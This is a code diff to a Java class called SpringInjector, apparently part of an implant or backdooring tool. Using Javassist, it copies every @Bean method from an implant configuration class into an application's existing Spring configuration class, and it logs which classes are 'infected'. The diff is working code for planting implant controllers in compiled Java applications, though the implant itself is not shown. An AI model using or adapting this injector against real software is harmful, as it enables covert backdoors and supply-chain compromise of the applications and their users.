@@ -102,10 +102,11 @@ public class SpringInjector {
 
                         if (!addBeanToSpringConfig(currentlyProcessing, implantComponent)) {
                             System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
+                            entry.passOn();
                             continue;
                         }
 
-                        currentlyProcessing.write(entry.addOnly());
+                        currentlyProcessing.write(entry.addAndGetStream());
                         System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
                     } else {
                         entry.passOn();
@@ -130,40 +131,39 @@ public class SpringInjector {
         String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
         String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
         String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
-        String implantBeanMethodName = "getImplantController";  // TODO Find this one by it's @Bean annotation?
 
-        // TODO This entire method should just be a generalized "copy and merge everything X into Y".
-
-        MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(implantBeanMethodName);
-        if (existingImplantControllerBean != null) {
-            return false;
-        }
-
-        try {
-            Map<String, String> translateTable = new HashMap<>();
-            translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
-            translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));
-
-            MethodInfo implantBeanMethod = implantSpringConfig.getMethod(implantBeanMethodName);
-            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
-            MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethodName, implantBeanMethodDesc);
-            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
-
-            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
-            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
-            targetBeanMethod.setCodeAttribute(codeAttr);
-
-            ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
-            if (exceptionsAttr != null) {
-                ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(existingSpringConfig.getConstPool(), translateTable);
-                targetBeanMethod.setExceptionsAttribute(exceptions);
+        // Copy all @Bean annotated methods from implant config class to target config class (if not already exists)
+        for (MethodInfo implantBeanMethod : findAllSpringBeanMethods(implantSpringConfig)) {
+            MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(implantBeanMethod.getName());
+            if (existingImplantControllerBean != null) {
+                return false;
             }
 
-            copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
+            try {
+                Map<String, String> translateTable = new HashMap<>();
+                translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
+                translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));
 
-            existingSpringConfig.addMethod(targetBeanMethod);
-        } catch (DuplicateMemberException e) {
-            throw new RuntimeException(e);
+                String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
+                MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
+                targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
+
+                CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
+                codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
+                targetBeanMethod.setCodeAttribute(codeAttr);
+
+                ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
+                if (exceptionsAttr != null) {
+                    ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(existingSpringConfig.getConstPool(), translateTable);
+                    targetBeanMethod.setExceptionsAttribute(exceptions);
+                }
+
+                copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
+
+                existingSpringConfig.addMethod(targetBeanMethod);
+            } catch (DuplicateMemberException e) {
+                throw new RuntimeException(e);
+            }
         }
 
         return true;
@@ -193,6 +193,29 @@ public class SpringInjector {
         }
 
         target.addAttribute(targetAnnotationsAttr);
+    }
+
+    private static List<MethodInfo> findAllSpringBeanMethods(ClassFile springController) {
+        List<MethodInfo> results = new ArrayList<>(1);
+
+        for (MethodInfo method : springController.getMethods()) {
+            AttributeInfo attr = method.getAttribute("RuntimeVisibleAnnotations");
+            if (attr == null) {
+                continue;
+            }
+            if (!(attr instanceof AnnotationsAttribute annotationAttr)) {
+                throw new RuntimeException("Failed to make sense of RuntimeVisibleAnnotations.");
+            }
+
+            for (Annotation annotation : annotationAttr.getAnnotations()) {
+                String annotationType = annotation.getTypeName();
+                if (annotationType.equals("org.springframework.context.annotation.Bean")) {
+                    results.add(method);
+                }
+            }
+        }
+
+        return results;
     }
 
     private static boolean isSpringConfigurationClass(final ClassFile classFile) {
